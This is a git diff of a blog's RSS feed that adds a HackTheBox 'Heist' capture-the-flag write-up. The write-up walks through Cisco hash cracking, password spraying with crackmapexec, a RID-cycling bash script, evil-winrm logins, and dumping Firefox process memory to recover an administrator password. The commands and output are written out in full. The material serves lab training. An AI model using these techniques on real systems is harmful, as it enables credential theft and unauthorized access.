@@ -5,7 +5,346 @@
     <link>https://fahmifj.github.io/tags/windows/</link>
     <description>Recent content in Windows on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Wed, 21 Jul 2021 07:07:50 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 28 Jul 2021 04:05:19 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Heist</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-heist/</link>
+      <pubDate>Wed, 28 Jul 2021 04:05:19 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-heist/</guid>
+      <description>Heist features a Help Desk-like system that allows a visitor to login as guest. This allows me to obtain several usernames and passwords that can be recovered from a Cisco configuration file which is attached to an ongoing issue. Valid credentials obtained by performing a password spray attack. With these credentials, a RID recycling attack is performed in order to obtain more usernames. A second attempt password spray with updated wordlist gains me a foothold in the system.</description>
+      <content:encoded><![CDATA[<p>Heist features a Help Desk-like system that allows a visitor to login as guest. This allows me to obtain several usernames and passwords that can be recovered from a Cisco configuration file which is attached to an ongoing issue. Valid credentials obtained by performing a password spray attack. With these credentials, a RID recycling attack is performed in order to obtain more usernames. A second attempt password spray with updated wordlist gains me a foothold in the system. There are multiple instances of Firefox running which can be dumped to obtain the password for administrator account.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Password spray attack</li>
+<li>Username enumeration via RPC using RID brute-force.</li>
+<li>Process dump</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>CrackMapExec</li>
+<li>Hashcat</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan using <code>nmap</code> discovers five open ports: an IIS Web server on port 80, MS-RPC on port 135 and port 49669, SMB on port 445, WinRM on port 5985.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
+$ nmap -p- -oA nmap/10-tcp-allport-heist 10.10.10.149
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:43 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.149
+Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
+Not shown: <span class="m">65530</span> filtered ports
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+49669/tcp open  unknown
+
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 148.82 seconds
+→ kali@kali «heist» «10.10.14.83» 
+$ nmap -p80,135,445,5985,49669 -sC -sV -oA nmap/10-tcp-allport-script-heist 10.10.10.149
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:46 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.149
+Host is up <span class="o">(</span>0.061s latency<span class="o">)</span>.
+
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+<span class="p">|</span> http-cookie-flags: 
+<span class="p">|</span>   /: 
+<span class="p">|</span>     PHPSESSID: 
+<span class="p">|</span>_      httponly flag not <span class="nb">set</span>
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Potentially risky methods: TRACE
+<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="p">|</span> http-title: Support Login Page
+<span class="p">|</span>_Requested resource was login.php
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="p">|</span>_http-title: Not Found
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+<span class="p">|</span>_clock-skew: 2m52s
+<span class="p">|</span> smb2-security-mode: 
+<span class="p">|</span>   2.02: 
+<span class="p">|</span>_    Message signing enabled but not required
+<span class="p">|</span> smb2-time: 
+<span class="p">|</span>   date: 2021-07-12T01:50:42
+<span class="p">|</span>_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 99.94 seconds
+</code></pre></div><p>I probably won&rsquo;t touch MS-RPC on port 49669, but the one on port 135 is worth checking to detect PrintNightmare (which I already did in <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">this post</a>).</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
+<p>Without credentials, I can&rsquo;t do much on SMB.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
+$ smbclient -N -L //10.10.10.149
+session setup failed: NT_STATUS_ACCESS_DENIED
+</code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting the website on port 80 presented with a login page.</p>
+<p><img class="img-container" src="imgs/image-20210712085020304.png" alt="image-20210712085020304"  />
+</p>
+<p>No register button was found here, so I clicked the guest login and it brought me to the following page.</p>
+<p><img class="img-container" src="imgs/image-20210712085409456.png" alt="image-20210712085409456"  />
+</p>
+<p>From the chat above, user Hazard attached his cisco configuration in a text file, and this config file contains several credentials.</p>
+<p><img class="img-container" src="imgs/image-20210712085452329.png" alt="image-20210712085452329"  />
+</p>
+<p>I know this is not my business, but looks like this part messed up his router 😅.</p>
+<p><img class="img-container" src="imgs/image-20210726174927930.png" alt="image-20210726174927930"  />
+</p>
+<p>So anyway, I will grab these credentials and also I will note that hazard asked the admin to create an account for accessing the files, which probably the SMB share.</p>
+<h3 id="password-crack">Password Crack</h3>
+<p>The first password can be recovered with <code>hashcat</code> (identified as md5crypt).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ./hashcat.exe -m <span class="m">500</span> hashes/heist-cisco.hash ../../rockyou.txt -O
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+<span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>:stealth1agent
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: md5crypt, MD5 <span class="o">(</span>Unix<span class="o">)</span>, Cisco-IOS <span class="nv">$1</span>$ <span class="o">(</span>MD5<span class="o">)</span>
+Hash.Target......: <span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>
+Time.Started.....: Mon Jul <span class="m">12</span> 08:58:28 <span class="m">2021</span> <span class="o">(</span><span class="m">2</span> secs<span class="o">)</span>
+Time.Estimated...: Mon Jul <span class="m">12</span> 08:58:30 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+Guess.Base.......: File <span class="o">(</span>../../rockyou.txt<span class="o">)</span>
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>The rest of the passwords are encrypted with cisco type 7 encryption. These passwords can be decrypted using <a href="https://davidbombal.com/cisco-type-7-password-decryption/">this site</a> .</p>
+<p><img class="img-container" src="imgs/image-20210712090727149.png" alt="image-20210712090727149"  />
+</p>
+<p><img class="img-container" src="imgs/image-20210712090628350.png" alt="image-20210712090628350"  />
+</p>
+<p>Now I have one password and two set of credentials.</p>
+<pre><code>?:$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
+rout3r:0242114B0E143F015F5D1E161713:$uperP@ssword
+admin:02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
+</code></pre><h3 id="access-as-hazard">Access as Hazard</h3>
+<h4 id="password-spray">Password Spray</h4>
+<p>With user <code>hazard</code> included, I have three usernames and three passwords. I will use them to perform a password spray attack on SMB using <code>crackmapexec</code>. The results reveals that the password <code>stealth1agent</code>  works for user <code>hazard</code>, but it doesn&rsquo;t show &ldquo;Pwn3d!&rdquo; message, this means no access to WinRM.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
+$ crackmapexec smb 10.10.10.149 -u usernames.list -p passwords.list
+SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>+<span class="o">]</span> SupportDesk<span class="se">\h</span>azard:stealth1agent 
+</code></pre></div><p>Another spray shows that user <code>hazard</code> can log with rpcclient as well.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
+$ ./exploits/rpcspray.sh usernames.list passwords.list 10.10.10.149
+<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@stealth1agent 
+Account Name: Hazard, Authority Name: SUPPORTDESK
+<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@<span class="nv">$uperP</span>@ssword 
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@stealth1agent 
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@<span class="nv">$uperP</span>@ssword 
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+</code></pre></div><h3 id="user-enumeration-via-rpc">User Enumeration via RPC</h3>
+<p>Since the share doesn&rsquo;t contain anything juicy, the other things I can do with user hazard is enumeration on RPC.</p>
+<p>Within <code>rpcclient</code> shell, <code>enumdomusers</code> is typically used to enumerate domain users, but it doesn&rsquo;t work here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
+$ rpcclient -U <span class="s1">&#39;hazard%stealth1agent&#39;</span> 10.10.10.149                   
+rpcclient $&gt; srvinfo
+        10.10.10.149   Wk Sv NT SNT         
+        platform_id     :       <span class="m">500</span>
+        os version      :       10.0
+        server <span class="nb">type</span>     :       0x9003
+rpcclient $&gt; enumdomusers
+result was NT_STATUS_CONNECTION_DISCONNECTED
+</code></pre></div><p>Based on the result, the problem here was not the user&rsquo;s permissions.</p>
+<p>Fortunately, the  <code>lookupnames</code>  command can be used to retrieve user&rsquo;s <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">SID</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; lookupnames hazard
+hazard S-1-5-21-4254423774-1266059056-3197185112-1008 <span class="o">(</span>User: 1<span class="o">)</span>
+</code></pre></div><p>Reverse lookups (SID to username) also works here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
+S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>1<span class="o">)</span>
+</code></pre></div><p>In Windows system, excluding RID section, this value <code>S-1-5-21-4254423774-1266059056-3197185112-RID</code>  is likely to be unique and is fixed for each computer domain. Like in Linux, an RID for a normal user starts from 1000, and knowing that reverse lookups is allowed, I can leverage it to enumerate the available users by incrementing the RID.</p>
+<p>The enumeration can be scripted using bash, and I&rsquo;ve created one to enumerate the first 20 users.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>
+<span class="nv">sid</span><span class="o">=</span><span class="s2">&#34;S-1-5-21-4254423774-1266059056-3197185112&#34;</span>
+
+<span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1000</span> 1020<span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
+ rpcclient -U <span class="s2">&#34;hazard%stealth1agent&#34;</span> -c <span class="s2">&#34;lookupsids </span><span class="nv">$sid</span><span class="s2">-</span><span class="nv">$i</span><span class="s2">;quit&#34;</span> 10.10.10.149 <span class="p">|</span> cut -d f2
+<span class="k">done</span>
+</code></pre></div><blockquote>
+<p>Note: <code>enumdomusers</code> RID returns in hexadecimal, for example a builtin administrator account has a default RID of 500 in decimal, so in hex it&rsquo;s 0x1F4.</p>
+</blockquote>
+<p>I saved the script as <code>rpc-userenum.sh</code> and ran it, and it returned with three valid usernames.</p>
+<p><img class="img-container" src="imgs/image-20210712105959998-1627299069625.png" alt="image-20210712105959998"  />
+</p>
+<p>I will add these usernames to my username wordlist.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-chase">Shell as Chase</h3>
+<h4 id="password-spray-1">Password Spray</h4>
+<p>With updated username wordlist, I could do another password spray attack on WinRM. The results shows a &ldquo;Pwn3d!&rdquo; message for user <code>chase</code> with a password of <code>Q4)sJu\Y8qz*A3?d </code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
+$ crackmapexec winrm 10.10.10.149 -u usernames.list -p passwords.list 
+WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:10.10.10.149<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
+WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> http://10.10.10.149:5985/wsman
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>+<span class="o">]</span> None<span class="se">\c</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div><h4 id="winrm---chase">WinRM - Chase</h4>
+<p>I can login into the system with <code>chase</code>&rsquo;s credentials using <code>evil-winrm</code>. The user flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
+$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;chase&#39;</span> -p <span class="s1">&#39;Q4)sJu\Y8qz*A3?d&#39;</span>
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+supportdesk<span class="se">\c</span>hase
+SupportDesk
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . :
+   IPv6 Address. . . . . . . . . . . : dead:beef::5d4b:5294:9dc3:565c
+   Link-local IPv6 Address . . . . . : fe80::5d4b:5294:9dc3:565c%15
+   IPv4 Address. . . . . . . . . . . : 10.10.10.149
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
+                                       10.10.10.2
+a127d...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h4 id="tools-share">Tools Share</h4>
+<p>Before going further, I would like to host my essential tools using <code>impacket-smbserver</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
+$ impacket-smbserver ef ~/tools -smb2support -username ef -password ef
+Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
+
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+<span class="o">[</span>*<span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.149,49708<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\e</span>f,SUPPORTDESK<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> User SUPPORTDESK<span class="se">\e</span>f authenticated successfully
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>The share then used on Heist. With this, I could use any of my tools directly from the share.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\&gt;</span> net use <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f /user:ef ef
+The <span class="nb">command</span> completed successfully.
+
+*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f
+*Evil-WinRM* PS Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::<span class="se">\\</span>10.10.14.83<span class="se">\e</span>f&gt; 
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-administrator">Shell as Administrator</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>In chase&rsquo;s Desktop there is another file called <code>todo.txt</code>. As the name implies, it contains to-do list.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; <span class="nb">type</span> todo.txt
+Stuff to-do:
+1. Keep checking the issues list.
+2. Fix the router config.
+
+Done:
+1. Restricted access <span class="k">for</span> guest user.
+</code></pre></div><p>While looking at the WinPEAS output, I noticed a lot of Firefox instance were opened.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">  [+] Current TCP Listening Ports
+   [?] Check for services restricted from the outside 
+  Enumerating IPv4 connections
+         
+  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
+
+...[SNIP]...
+
+  TCP        127.0.0.1             49672         127.0.0.1             49673           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
+  TCP        127.0.0.1             49673         127.0.0.1             49672           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
+  TCP        127.0.0.1             49674         127.0.0.1             49675           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
+  TCP        127.0.0.1             49675         127.0.0.1             49674           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
+  TCP        127.0.0.1             49680         127.0.0.1             49681           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
+  TCP        127.0.0.1             49681         127.0.0.1             49680           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
+  TCP        127.0.0.1             49682         127.0.0.1             49683           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
+  TCP        127.0.0.1             49683         127.0.0.1             49682           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
+</code></pre></div><p>Then, the previous to-do list means that user chase periodically open a browser to check the issues list</p>
+<h4 id="dump-firefox-process">Dump Firefox Process</h4>
+<p>I don&rsquo;t see there is a RDP running in the system, so I will employs <code>procdump64.exe</code> to dump the Firefox data from the memory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f<span class="se">\p</span>rocdump64.exe -accepteula -ma <span class="m">6868</span>
+
+ProcDump v10.0 - Sysinternals process dump utility
+Copyright <span class="o">(</span>C<span class="o">)</span> 2009-2020 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+<span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> initiated: C:<span class="se">\i</span>amf<span class="se">\f</span>irefox.exe_210712_230707.dmp
+<span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> writing: Estimated dump file size is <span class="m">535</span> MB.
+<span class="o">[</span>23:07:08<span class="o">]</span> Dump <span class="m">1</span> complete: <span class="m">536</span> MB written in 1.5 seconds
+<span class="o">[</span>23:07:09<span class="o">]</span> Dump count reached.
+</code></pre></div><p>Because I don&rsquo;t want to grab that fatty <code>536 MB</code> file,  I will use  <code>strings64.exe</code> and redirect the output to a text file to get some readable part from the dump file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; cmd /c <span class="s2">&#34;\\10.10.14.83\ef\strings64.exe -accepteula firefox.exe_210712_230707.dmp &gt; foxdump.txt&#34;</span>
+cmd.exe : 
+    + CategoryInfo          : NotSpecified: <span class="o">(</span>:String<span class="o">)</span> <span class="o">[]</span>, RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+Strings v2.54 - Search <span class="k">for</span> ANSI and Unicode strings in binary images.
+Copyright <span class="o">(</span>C<span class="o">)</span> 1999-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; dir
+
+
+    Directory: C:<span class="se">\i</span>amf
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        7/12/2021  11:07 PM      <span class="m">547841456</span> firefox.exe_210712_230707.dmp
+-a----        7/12/2021  11:18 PM      <span class="m">136871696</span> foxdump.txt
+</code></pre></div><p>Searching for string &ldquo;password&rdquo; reveals the admin password (<code>4dD!5}x/re8]FBuZ</code>).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; gc foxdump.txt <span class="p">|</span> <span class="k">select</span>-string <span class="s2">&#34;password&#34;</span>
+
+<span class="s2">&#34;C:\Program Files\Mozilla Firefox\firefox.exe&#34;</span> localhost/login.php?login_username<span class="o">=</span>admin@support.htb<span class="p">&amp;</span><span class="nv">login_password</span><span class="o">=</span>4dD!5<span class="o">}</span>x/re8<span class="o">]</span>FBuZ<span class="p">&amp;</span><span class="nv">login</span><span class="o">=</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p><strong>[Side note]</strong></p>
+<p>If this was done by automation script, maybe I could try to drop a packet sniffer before dumping the whole process.</p>
+<p><img class="img-container" src="imgs/image-20210726192951302.png" alt="image-20210726192951302"  />
+</p>
+<h4 id="winrm---administrator">WinRM - Administrator</h4>
+<p>The password <code>4dD!5}x/re8]FBuZ</code> is reused for administrator account.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
+$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;Administrator&#39;</span> -p <span class="s1">&#39;4dD!5}x/re8]FBuZ&#39;</span>
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+supportdesk<span class="se">\a</span>dministrator
+SupportDesk
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . :
+   IPv6 Address. . . . . . . . . . . : dead:beef::60f9:33ef:49c0:aa91
+   Link-local IPv6 Address . . . . . : fe80::60f9:33ef:49c0:aa91%15
+   IPv4 Address. . . . . . . . . . . : 10.10.10.149
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
+                                       10.10.10.2
+50dfa...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://davidbombal.com/cisco-type-7-password-decryption/">https://davidbombal.com/cisco-type-7-password-decryption/</a></li>
+<li></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>Windows 10 Troubleshoot: Permissions</title>
       <link>https://fahmifj.github.io/blog/fixing-windows-10-permissions/</link>
@@ -29,7 +368,6 @@
 <p><img class="img-container" src="imgs/image-20210721043547662.png" alt="image-20210721043547662"  />
 </p>
 <p>Also, according to the error I got when I was trying to install a Windows SDK and uninstall Node, it was clear these all related to the system permissions (even my Wi-Fi problem).</p>
-<h2 id="fix-the-permissions-">Fix The Permissions 🔨</h2>
 <p>The inspection start from  <code>C:\Program Files\</code> and <code>C:\Program Files (x86)\</code> (the default folder for installed apps), but no problem was found there. So, the next one to inspect is <code>C:\ProgramData</code>, where all application data is stored/created.</p>
 <p>After inspecting all the folders under <code>C:\ProgramData\</code> and <code>C:\ProgramData\Microsoft\Windows</code>, I found out that some of the folders only have my account listed in their security properties.</p>
 <p><img class="img-container" src="imgs/image-20210721044802348.png" alt="image-20210721044802348"  />
@@ -41,6 +379,7 @@
 <p><img class="img-container" src="imgs/image-20210721045624596.png" alt="image-20210721045624596"  />
 </p>
 <p>Now I know how the default permissions look like, I could apply the same permission to resolve the problems I faced,</p>
+<h2 id="fix-the-permissions-">Fix The Permissions 🔨</h2>
 <h3 id="fix-office-error-code-30015-4-5">Fix Office Error Code: 30015-4 (5)</h3>
 <p>To fix &ldquo;<code>Error Code: 30015-4 (5)</code>&rdquo;, I  will enable the inheritance on the affected folder, which is <code>C:\ProgramData\Microsoft\OFFICE</code>. So that the permissions on the <code>Microsoft</code> folder will be inherited to the <code>OFFICE</code> folder. And then I will remove my account, &ldquo;Fahmi FJ&rdquo;, from the permission entries.</p>
 <p><img class="img-container" src="imgs/image-20210721051824838.png" alt="image-20210721051824838"  />
@@ -1304,188 +1643,6 @@ sonny@CEREAL C:\Users\sonny&gt;dir desktop\
 <li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
 <li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li>
 <li><a href="https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Omni</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-omni/</link>
-      <pubDate>Thu, 06 May 2021 23:03:39 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-omni/</guid>
-      <description>Another exploitation on embedded system software, this time it&amp;#39;s on the OS side</description>
-      <content:encoded><![CDATA[<p>Omni is an easy difficulty machine from HackTheBox that runs the IoT version of Windows 10. The machine is known to be vulnerable to SirepRAT, allowing an attacker to gain a remote code execution as SYSTEM. Leveraging the RAT, I&rsquo;m able to gain a foothold on the system and obtain two set of credentials that can be used to decrypt the encrypted flags.</p>
-<h3 id="skills-learned">Skills Learned</h3>
-<ul>
-<li>Exploiting Windows IoT</li>
-<li>Decrypting PSCredential object</li>
-</ul>
-<h3 id="tools">Tools</h3>
-<ul>
-<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
-<li>Nmap - Preinstalled in Kali Linux</li>
-<li>SirepRAT - <a href="https://github.com/SafeBreach-Labs/SirepRAT">https://github.com/SafeBreach-Labs/SirepRAT</a></li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>An initial port scan using <code>nmap</code> discovers two open ports: MSRPC on port 135, and a Microsoft IIS on port 8080.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
-$ nmap -sC -sV -oN nmap/initial-omni -v <span class="s1">&#39;10.10.10.204&#39;</span>
-<span class="c1"># Nmap 7.80 scan initiated Sun Aug 23 09:25:53 2020 as: nmap -sC -sV -oN nmap/initial-omni -v 10.10.10.204</span>
-Nmap scan report <span class="k">for</span> 10.10.10.204
-Host is up <span class="o">(</span>0.056s latency<span class="o">)</span>.
-
-PORT     STATE SERVICE VERSION
-135/tcp  open  msrpc   Microsoft Windows RPC
